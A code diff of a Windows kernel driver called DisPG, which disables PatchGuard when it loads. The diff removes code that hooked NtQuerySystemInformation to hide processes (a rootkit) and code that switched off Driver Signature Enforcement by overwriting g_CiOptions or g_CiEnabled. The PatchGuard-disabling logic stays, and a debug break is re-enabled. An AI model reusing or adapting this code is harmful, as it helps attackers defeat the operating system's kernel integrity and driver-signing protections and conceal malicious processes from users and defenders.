@@ -4,7 +4,6 @@
 //
 #include "stdafx.h"
 #include "util.h"
-#include "rootkit.h"
 #include "win8.h"
 #include "winX.h"
 
@@ -63,12 +62,6 @@ EXTERN_C static
 NTSTATUS DispgpDisablePatchGuard();
 
 EXTERN_C static
-NTSTATUS DispgpEnableRootkitFunction();
-
-EXTERN_C static
-void DispgpDisableSigningEnforcement();
-
-EXTERN_C static
 bool DispgpIsWindows8OrGreater();
 
 EXTERN_C static
@@ -93,7 +86,6 @@ static ULONG64 g_KernelVersion = 0;
 // always
 static ULONG_PTR g_ExAcquireResourceSharedLite = 0;
 // ifVistaOr7
-static BOOLEAN* g_CiEnabled = nullptr;
 static POOL_TRACKER_BIG_PAGES** g_PoolBigPageTable = nullptr;
 // ifXp
 static POOL_TRACKER_BIG_PAGES_XP** g_PoolBigPageTableXp = nullptr;
@@ -107,7 +99,6 @@ static ULONG_PTR g_KiCommitThreadWait = 0;
 static ULONG_PTR g_KiAttemptFastRemovePriQueue = 0;
 static ULONG_PTR g_KeDelayExecutionThread = 0;
 static ULONG_PTR g_KeWaitForSingleObject = 0;
-static UINT32* g_CiOptions = nullptr;
 
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -124,10 +115,11 @@ NTSTATUS DriverEntry(
 {
     PAGED_CODE();
 
-    //DBG_BREAK();
+    DBG_BREAK();
 
-    DBG_PRINT("[%4x:%4x] Initialize : Starting DisPG.\n",
-        PsGetCurrentProcessId(), PsGetCurrentThreadId());
+    DBG_PRINT("[%5Iu:%5Iu] Initialize : Starting DisPG.\n",
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()));
 
     auto status = DispgpInitialize(RegistryPath);
     if (!NT_SUCCESS(status))
@@ -135,39 +127,19 @@ NTSTATUS DriverEntry(
         return status;
     }
 
-    // Disable PatchGuard. This function has to be called before
-    // DispgpEnableRootkitFunction or DispgpDisableSigningEnforcement as these
-    // functions install kernel patches.
+    // Disable PatchGuard.
     status = DispgpDisablePatchGuard();
     if (!NT_SUCCESS(status))
     {
         return status;
     }
-    DBG_PRINT("[%4x:%4x] Initialize : PatchGuard has been disarmed.\n",
-        PsGetCurrentProcessId(), PsGetCurrentThreadId());
+    DBG_PRINT("[%5Iu:%5Iu] Initialize : PatchGuard has been disarmed.\n",
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()));
 
-    //// Enables rootkit function by installing kernel patches. The driver should
-    //// never be unloaded after this function succeeded as it installs hook code
-    //// that calls this driver.
-    //status = DispgpEnableRootkitFunction();
-    //if (!NT_SUCCESS(status))
-    //{
-    //    return status;
-    //}
-    //DBG_PRINT("[%4x:%4x] Initialize : Hiding processes has been enabled.\n",
-    //    PsGetCurrentProcessId(), PsGetCurrentThreadId());
-
-    // Disable DSE if applicable
-    if (!DispgpIsWindowsXp())
-    {
-        DispgpDisableSigningEnforcement();
-        DBG_PRINT("[%4x:%4x] Initialize : Driver Signing Enforcement has been"
-                  " disabled.\n",
-            PsGetCurrentProcessId(), PsGetCurrentThreadId());
-    }
-
-    DBG_PRINT("[%4x:%4x] Initialize : Enjoy freedom ;)\n",
-        PsGetCurrentProcessId(), PsGetCurrentThreadId());
+    DBG_PRINT("[%5Iu:%5Iu] Initialize : Enjoy freedom ;)\n",
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentProcessId()),
+        reinterpret_cast<ULONG_PTR>(PsGetCurrentThreadId()));
     return status;
 }
 
@@ -260,7 +232,6 @@ NTSTATUS DispgpLoadSymbolAddresses(
     const SymbolSet requireSymbols[] =
     {
         { L"ntoskrnl!ExAcquireResourceSharedLite",  reinterpret_cast<void**>(&g_ExAcquireResourceSharedLite),   always, },
-        { L"ntoskrnl!g_CiEnabled",                  reinterpret_cast<void**>(&g_CiEnabled),                     ifVistaOr7, },
         { L"ntoskrnl!PoolBigPageTable",             reinterpret_cast<void**>(&g_PoolBigPageTable),              ifVistaOr7, },
         { L"ntoskrnl!PoolBigPageTable",             reinterpret_cast<void**>(&g_PoolBigPageTableXp),            ifXp, },
         { L"ntoskrnl!PoolBigPageTableSize",         reinterpret_cast<void**>(&g_PoolBigPageTableSize),          ifNot8OrGreater, },
@@ -271,7 +242,6 @@ NTSTATUS DispgpLoadSymbolAddresses(
         { L"ntoskrnl!KiAttemptFastRemovePriQueue",  reinterpret_cast<void**>(&g_KiAttemptFastRemovePriQueue),   if8OrGreater, },
         { L"ntoskrnl!KeDelayExecutionThread",       reinterpret_cast<void**>(&g_KeDelayExecutionThread),        if8OrGreater, },
         { L"ntoskrnl!KeWaitForSingleObject",        reinterpret_cast<void**>(&g_KeWaitForSingleObject),         if8OrGreater, },
-        { L"ci!g_CiOptions",                        reinterpret_cast<void**>(&g_CiOptions),                     if8OrGreater, },
     };
 
     // Load each symbol from the registry if required
@@ -388,64 +358,6 @@ NTSTATUS DispgpDisablePatchGuard()
         status = WinXDisablePatchGuard(symbols);
     }
     return status;
-}
-
-
-// Enable hiding processes function
-ALLOC_TEXT(INIT, DispgpEnableRootkitFunction)
-EXTERN_C static
-NTSTATUS DispgpEnableRootkitFunction()
-{
-    PAGED_CODE();
-    auto status = STATUS_UNSUCCESSFUL;
-
-    if ((g_WindowsVersion.dwMajorVersion == 6 && g_WindowsVersion.dwMinorVersion == 3)
-     || (g_WindowsVersion.dwMajorVersion == 6 && g_WindowsVersion.dwMinorVersion == 1))
-    {
-        // For Win 8 and 7
-        status = RootkitEnableRootkit(
-            18,
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_Win8_1),
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_Win8_1End));
-    }
-    else if (g_WindowsVersion.dwMajorVersion == 6 && g_WindowsVersion.dwMinorVersion == 0)
-    {
-        // For Win Vista
-        status = RootkitEnableRootkit(
-            18,
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_WinVista),
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_WinVistaEnd));
-    }
-    else if (DispgpIsWindowsXp())
-    {
-        // For Win XP
-        status = RootkitEnableRootkit(
-            18,
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_WinXp),
-            reinterpret_cast<ULONG_PTR>(AsmNtQuerySystemInformation_WinXpEnd));
-    }
-    return status;
-}
-
-
-// Disable Driver Signing Enforcement. This function should never been called
-// on Win XP since it has no Driver Signing Enforcement on the platform.
-ALLOC_TEXT(INIT, DispgpDisableSigningEnforcement)
-EXTERN_C static
-void DispgpDisableSigningEnforcement()
-{
-    PAGED_CODE();
-
-    if (DispgpIsWindows8OrGreater())
-    {
-        // For Win 8.1
-        *g_CiOptions = 0;
-    }
-    else
-    {
-        // For Win 7 and Vista
-        *g_CiEnabled = FALSE;
-    }
 }
 
 
